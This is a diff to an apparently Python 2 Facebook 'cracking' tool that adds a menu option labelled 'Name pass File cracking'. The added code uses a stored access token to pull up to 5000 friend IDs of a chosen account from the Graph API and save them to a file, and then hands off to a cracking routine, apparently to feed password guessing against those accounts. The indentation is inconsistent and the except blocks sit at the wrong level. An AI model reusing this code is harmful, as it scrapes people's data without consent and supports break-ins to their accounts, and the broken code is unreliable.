@@ -497,6 +497,52 @@ def a_s():
 	    print"[!] File Not Found."
 	    raw_input('Press Enter To Back. ')
 	    crack()
+    elif a_s == '4':
+	os.system('clear')
+        print logo
+        print '\033[1;93m~~~~ Name pass File cracking ~~~~\033[1;91m'
+        print 47 * '-'
+	idt = raw_input("[+] Input ID : ")
+	try:
+		jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
+		op = json.loads(jok.text)
+		print"[✓] Account Name : "+op["name"]
+	except KeyError:
+		print"[!] Friend Not Found"
+		raw_input("Press Enter To Back ")
+		grab()
+	r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(5000)&access_token="+toket)
+	z=json.loads(r.text)
+	hamza('[✓] Getting Friends Numeric IDs...')
+	print"--------------------------------------"
+	bz = open('save/id.txt','w')
+	for a in z['friends']['data']:
+		idh.append(a['id'])
+		bz.write(a['id'] + '\n')
+		print ("\r["+str(len(idh))+" ] => "+a['id']),;sys.stdout.flush();time.sleep(0.001)
+	bz.close()
+	print '\r[✓] The Process Has Been Completed.'
+	print"\r[✓] Total IDs Founded : "+str(len(idh))
+	done = raw_input("\r[?] Save File With Name : ")
+	print("\r[✓] The File Has Been Saved As save/"+done)
+	raw_input("\nPress Enter To Back ")
+	crack()
+except IOError:
+	print"[!] Error While Creating file"
+	raw_input("\nPress Enter To Back ")
+	crack()
+except (KeyboardInterrupt,EOFError):
+	print("[!]The Process Has Been Stopped")
+	raw_input("\nPress Enter To Back ")
+	crack()
+except KeyError:
+	print('[!] Error')
+	raw_input("\nPress Enter To Back ")
+	crack()
+except requests.exceptions.ConnectionError:
+	print"[✖] No Connection"
+	time.sleep(1)
+	crack()
     elif a_s == '0':
         menu()
     else:
